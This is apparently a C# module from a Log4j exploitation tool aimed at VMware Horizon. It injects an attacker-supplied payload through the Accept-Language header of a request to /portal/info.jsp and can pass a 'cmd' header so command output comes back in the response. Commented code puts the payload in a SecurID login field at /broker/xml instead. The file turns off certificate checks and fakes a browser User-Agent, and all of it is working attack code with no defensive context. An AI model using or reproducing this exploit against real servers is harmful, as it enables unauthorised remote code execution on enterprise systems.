using System;
using System.IO;
using System.Net;
using System.Text;

namespace Vm4j_exp.ExecPayload
{
    class VHorizon
    {
        private static string UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36";
        private static int Timeout = 10000;
        public static string VHorizonEcho(string url, string cmd, string payload)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = false;
            Log log = new Log();
            /*
             * remove comment if request url use /broker/xml
             * 
             * string postdata = "<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>securid-passcode</name><params><param><name>username</name><values><value>"+payload+"</value></values></param><param><name>passcode</name><values><value>cm4j</value></values></param></params></screen></do-submit-authentication></broker>";
             */
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url.EndsWith("/") ? url + "portal/info.jsp" : url + "/portal/info.jsp");
#if DEBUG
                System.Net.WebProxy proxy = new WebProxy("127.0.0.1", 8080);
                request.Proxy = proxy;
#else 
            request.Proxy = null;
#endif
                request.Method = "GET";
                request.UserAgent = UserAgent;
                request.KeepAlive = false;
                request.Accept = "*/*";
                request.Timeout = Timeout;
                request.Headers.Add("Accept-Language",payload);
                request.Headers.Add("cmd", cmd);
                /*
                 * remove comment if request url use /broker/xml
                 * 
                byte[] data = Encoding.UTF8.GetBytes(postdata);
                request.ContentLength = data.Length;
                using (Stream reqStream = request.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                */
                StringBuilder sb = new StringBuilder();
                using (HttpWebResponse resp = (HttpWebResponse)request.GetResponse())
                {
                    using (StreamReader reader = new StreamReader(resp.GetResponseStream(), Encoding.UTF8))
                    {
                        try
                        {
                            while (!reader.EndOfStream)
                            {
                                sb.Append((char)reader.Read());
                            }
                        }
                        catch (IOException e)
                        {
                            log.LogError("Get Error:" + e.Message);
                        }
                    }
                }
                string result = sb.ToString();
                return result;
            }
            catch (Exception e)
            {
                log.LogError("Get Error:" + e.Message);
                return "false";
            }
        }
        public static string VHorizonExec(string url, string payload)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.Expect100Continue = false;
            Log log = new Log();
            /*
             * remove comment if request url use /broker/xml
             * 
             * string postdata = "<?xml version='1.0' encoding='UTF-8'?><broker version='14.0'><do-submit-authentication><screen><name>securid-passcode</name><params><param><name>username</name><values><value>"+payload+"</value></values></param><param><name>passcode</name><values><value>cm4j</value></values></param></params></screen></do-submit-authentication></broker>";
             */
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url.EndsWith("/") ? url + "portal/info.jsp" : url + "/portal/info.jsp");
#if DEBUG
                System.Net.WebProxy proxy = new WebProxy("127.0.0.1", 8080);
                request.Proxy = proxy;
#else 
            request.Proxy = null;
#endif
                request.Method = "GET";
                //request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.UserAgent = UserAgent;
                request.KeepAlive = false;
                request.Accept = "*/*";
                request.Timeout = Timeout;
                request.Headers.Add("Accept-Language", payload);
                /*
                 * remove comment if request url use /broker/xml
                 * 
                byte[] data = Encoding.UTF8.GetBytes(postdata);
                request.ContentLength = data.Length;
                using (Stream reqStream = request.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                */
                StringBuilder sb = new StringBuilder();
                using (HttpWebResponse resp = (HttpWebResponse)request.GetResponse())
                {
                    return "true";
                }

            }
            catch (Exception e)
            {
                log.LogError("Get Error:" + e.Message);
                return "false";
            }
        }
    }
}
